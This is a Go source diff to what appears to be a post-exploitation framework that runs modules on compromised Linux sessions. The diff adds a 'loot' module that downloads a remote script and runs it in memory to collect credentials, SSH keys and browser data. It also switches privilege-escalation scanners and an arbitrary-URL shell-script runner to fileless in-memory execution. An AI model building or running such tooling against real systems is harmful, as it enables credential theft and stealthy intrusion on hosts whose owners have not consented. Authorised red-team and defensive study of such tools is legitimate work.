@@ -11,6 +11,7 @@ type Module interface {
 	Name() string        // Module identifier (e.g., "peas", "lse", "sh")
 	Category() string    // Category (e.g., "Linux", "Windows", "Misc", "Custom")
 	Description() string // Short description
+	ExecutionMode() string // "memory", "disk-cleanup", "disk-no-cleanup"
 	Run(session *SessionInfo, args []string) error
 }
 
@@ -28,6 +29,7 @@ func GetModuleRegistry() *ModuleRegistry {
 		// Register built-in modules
 		globalRegistry.Register(&PEASModule{})
 		globalRegistry.Register(&LSEModule{})
+		globalRegistry.Register(&LootModule{})
 		globalRegistry.Register(&PSPYModule{})
 		globalRegistry.Register(&PrivescModule{})
 		globalRegistry.Register(&ShellScriptModule{})
@@ -96,6 +98,7 @@ const (
 	URL_LINPEAS = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
 	URL_LSE     = "https://github.com/chsoares/linux-smart-enumeration/raw/refs/heads/master/lse.sh"
 	URL_DEEPCE  = "https://raw.githubusercontent.com/stealthcopter/deepce/refs/heads/main/deepce.sh"
+	URL_LOOT    = "https://github.com/chsoares/ezpz/raw/refs/heads/main/utils/loot.sh"
 	URL_PSPY64  = "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64"
 	URL_PSPY32  = "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32"
 
@@ -134,9 +137,10 @@ type PEASModule struct{}
 func (m *PEASModule) Name() string        { return "peas" }
 func (m *PEASModule) Category() string    { return "linux" }
 func (m *PEASModule) Description() string { return "Run LinPEAS privilege escalation scanner" }
+func (m *PEASModule) ExecutionMode() string { return "memory" }
 
 func (m *PEASModule) Run(session *SessionInfo, args []string) error {
-	return session.RunScript(URL_LINPEAS, args)
+	return session.RunScriptInMemory(URL_LINPEAS, args)
 }
 
 // LSEModule - Linux Smart Enumeration
@@ -145,13 +149,14 @@ type LSEModule struct{}
 func (m *LSEModule) Name() string        { return "lse" }
 func (m *LSEModule) Category() string    { return "linux" }
 func (m *LSEModule) Description() string { return "Run Linux Smart Enumeration" }
+func (m *LSEModule) ExecutionMode() string { return "memory" }
 
 func (m *LSEModule) Run(session *SessionInfo, args []string) error {
 	// Default to -l1 if no args provided
 	if len(args) == 0 {
 		args = []string{"-l1"}
 	}
-	return session.RunScript(URL_LSE, args)
+	return session.RunScriptInMemory(URL_LSE, args)
 }
 
 // PSPYModule - Monitor processes without root (pspy64)
@@ -160,10 +165,23 @@ type PSPYModule struct{}
 func (m *PSPYModule) Name() string        { return "pspy" }
 func (m *PSPYModule) Category() string    { return "linux" }
 func (m *PSPYModule) Description() string { return "Run pspy process monitor" }
+func (m *PSPYModule) ExecutionMode() string { return "disk-cleanup" }
 
 func (m *PSPYModule) Run(session *SessionInfo, args []string) error {
 	// Default to pspy64, but could add detection for 32-bit systems
 	return session.RunBinary(URL_PSPY64, args)
+}
+
+// LootModule - ezpz post-exploitation script (credentials, SSH keys, browser data)
+type LootModule struct{}
+
+func (m *LootModule) Name() string        { return "loot" }
+func (m *LootModule) Category() string    { return "linux" }
+func (m *LootModule) Description() string { return "Run ezpz post-exploitation script" }
+func (m *LootModule) ExecutionMode() string { return "memory" }
+
+func (m *LootModule) Run(session *SessionInfo, args []string) error {
+	return session.RunScriptInMemory(URL_LOOT, args)
 }
 
 // ============================================================================
@@ -182,6 +200,7 @@ type PrivescModule struct{}
 func (m *PrivescModule) Name() string        { return "privesc" }
 func (m *PrivescModule) Category() string    { return "misc" }
 func (m *PrivescModule) Description() string { return "Upload multiple privilege escalation scripts" }
+func (m *PrivescModule) ExecutionMode() string { return "disk-no-cleanup" }
 
 func (m *PrivescModule) Run(session *SessionInfo, args []string) error {
 	var scripts []string
@@ -235,6 +254,7 @@ type ShellScriptModule struct{}
 func (m *ShellScriptModule) Name() string        { return "sh" }
 func (m *ShellScriptModule) Category() string    { return "custom" }
 func (m *ShellScriptModule) Description() string { return "Run arbitrary shell script from URL" }
+func (m *ShellScriptModule) ExecutionMode() string { return "memory" }
 
 func (m *ShellScriptModule) Run(session *SessionInfo, args []string) error {
 	if len(args) == 0 {
@@ -244,5 +264,5 @@ func (m *ShellScriptModule) Run(session *SessionInfo, args []string) error {
 	url := args[0]
 	scriptArgs := args[1:]
 
-	return session.RunScript(url, scriptArgs)
+	return session.RunScriptInMemory(url, scriptArgs)
 }
